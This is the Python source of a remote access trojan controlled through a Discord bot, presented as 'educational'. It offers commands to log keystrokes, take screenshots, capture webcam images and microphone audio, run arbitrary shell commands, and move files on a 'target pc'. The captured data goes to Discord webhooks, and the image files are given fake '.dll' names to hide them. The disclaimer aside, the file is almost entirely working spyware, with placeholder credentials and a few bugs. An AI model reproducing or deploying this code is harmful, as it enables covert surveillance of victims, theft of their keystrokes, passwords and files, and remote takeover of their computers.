########################################
# This is an educational piece of code,
# do not use for malicious purposes
########################################

# more features may be added later


import webbrowser
import time
import requests
import pyautogui
import cv2
import platform
import psutil
import socket
import os
import subprocess
import pyaudio
import wave
import pynput
import threading
import discord
from discord.ext import commands

TOKEN = "your bot token"
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")


#@bot.command()
#async def test(ctx):
#    await ctx.send("ok")


@bot.command()
async def options(ctx):
    commands_list = """```
!sysinfo       - Captures system info
!ss            - Captures a screenshot
!webcam        - Captures webcam footage
!startkeylog   - Begins logging keystrokes
!stopkeylog    - Stops logging keystrokes
!openapp       - Opens a desired app
!cmd           - Executes a command
!openweb       - Opens a website
!showimage     - Displays an attachment on target pc
!uploadfile    - Uploads a file on the system
!downloadfile  - Downloads a file from the system
!startmic      - Starts recording audio
!stopmic       - Stops recording audio
```"""
    await ctx.send(commands_list)
recording = False

def record_mic(filename="mic_audio.wav"):
    global recording
    recording = True

    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

    frames = []
    while recording:
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))

@bot.command()
async def startmic(ctx):
    global recording
    if recording:
        await ctx.send("Already recording")
        return

    await ctx.send("Recording...")



    thread = threading.Thread(target=record_mic)
    thread.start()

@bot.command()
async def stopmic(ctx):
    global recording
    if not recording:
        await ctx.send("Not recording")
        return

    recording = False
    await ctx.send("Recording stopped")

    file_path = "mic_audio.wav"
    while not os.path.exists(file_path):
        pass
    await ctx.send(file=discord.File(file_path))
    os.remove(file_path)
    await ctx.send("Audio file deleted from the system.")



waiting_for_file = False

@bot.command()
async def uploadfile(ctx):
    global waiting_for_file
    waiting_for_file = True
    await ctx.send("Upload file:")

@bot.event
async def on_message(message):
    global waiting_for_file

    if waiting_for_file and message.attachments:
        for attachment in message.attachments:
            file_url = attachment.url
            file_name = attachment.filename
            response = requests.get(file_url)
            with open(file_name, "wb") as file:
                file.write(response.content)
            await message.channel.send(f"File {file_name} has been saved")
            waiting_for_file = False
            break

    await bot.process_commands(message)


@bot.command()
async def downloadfile(ctx, filename: str):
    if os.path.exists(filename):
        await ctx.send(file=discord.File(filename))
    else:
        await ctx.send("File not found")

waiting_for_image = False

@bot.command()
async def showimage(ctx):
    global waiting_for_image
    waiting_for_image = True
    await ctx.send("Upload image:")

@bot.event
async def on_message(message):
    global waiting_for_image

    if waiting_for_image and message.attachments:
        for attachment in message.attachments:
            if attachment.filename.endswith(("png", "jpg", "jpeg", "gif")):
                image_url = attachment.url
                response = requests.get(image_url)
                image_path = "downloaded_image.jpg"
                with open(image_path, "wb") as file:
                    file.write(response.content)
                subprocess.Popen(["start", image_path], shell=True)

                await message.channel.send(f"Image displayed: {attachment.url}")
                
                waiting_for_image = False
                break

    await bot.process_commands(message)

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        if len(output) > 1900:
            output = output[:1900] + "..."
        await ctx.send(f"```\n{output}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"```\n{e.output}\n```")


@bot.command()
async def openweb(ctx, url: str):
    try:
        webbrowser.open(url)
        await ctx.send(f"Opened {url} in browser.")
    except Exception as e:
        await ctx.send(f"Error: {e}")
@bot.command()
async def openapp(ctx, app_name: str):
    try:
        subprocess.Popen(app_name, shell=True)
        await ctx.send(f"Opened {app_name}")
    except Exception as e:
        await ctx.send(f"Error opening {app_name}: {e}")

@bot.command()
async def ss(ctx):
    await send_screenshot()

@bot.command()
async def webcam(ctx):
    await send_webcam_snapshot()
@bot.command()
async def sysinfo(ctx):
    await send_system_info()

keylogger_running = False
keylogger_thread = None
def start_keylogger():
    global keylogger_running
    keylogger_running = True
    
    while keylogger_running:
        print("Logging keys")
        time.sleep(1)

    print("Keylogger stopped")

@bot.command()
async def startkeylog(ctx):
    global keylogger_running, keylogger_thread

    if keylogger_running:
        await ctx.send("Keylogger active")
        return

    await ctx.send("Starting keylogger")
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

@bot.command()
async def stopkeylog(ctx):
    global keylogger_running

    if not keylogger_running:
        await ctx.send("Keylogger is not running!")
        return


    await ctx.send("Stopping keylogger...")
    keylogger_running = False
    
    if keylogger_thread:
        keylogger_thread.join()
    await ctx.send("Keylogger stopped.")


ss = "your webhook"
web = "your webhook"
si = "your webhook"
keylog_webhook = "your webhook"

def get_system_info():
    info2 = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture()[0],
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM Size (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Disk Space (GB)": round(psutil.disk_usage('/').total / (1024 ** 3), 2),
        "Available Disk (GB)": round(psutil.disk_usage('/').free / (1024 ** 3), 2),
    }
    return info2

def send_system_info():
    info = get_system_info()
    formatted_info = "\n".join([f"**{key}:** {value}" for key, value in info.items()])

    payload = {"content": f"```yaml\n{formatted_info}\n```"}
    response = requests.post(si, json=payload)
    
    if response.status_code == 200:
        print("System info sent")
    else:
        print(f"Failed to send system info: {response.status_code}")

def send_screenshot():
    screenshot_path = "system.dll.png"
    pyautogui.screenshot(screenshot_path)

    with open(screenshot_path, "rb") as file:
        response = requests.post(ss, files={"file": file})
    
    os.remove(screenshot_path)

    if response.status_code == 200:
        print("Screenshot sent")
    else:
        print(f"Failed to send ss: {response.status_code}")



def send_webcam_snapshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        snapshot_path = "windows64.dll.jpg"
        cv2.imwrite(snapshot_path, frame)

        with open(snapshot_path, "rb") as file:
            response = requests.post(web, files={"file": file})
            
        os.remove(snapshot_path)

        if response.status_code == 200:
            print("Webcam snapshot sent")
        else:
            print(f"Failed to send webcam snapshot: {response.status_code}")
    else:
        print("Failed to capture webcam pic")


def send_key(key):
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    payload = {"content": f"**Key Pressed:** `{key}`"}
    response = requests.post(keylog_webhook, json=payload)

    if response.status_code == 200:
        print(f"Key '{key}' sent successfully")
    else:
        print(f"Failed to send key '{key}': {response.status_code}")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=send_key) as listener:
        listener.join()


bot.run(TOKEN)
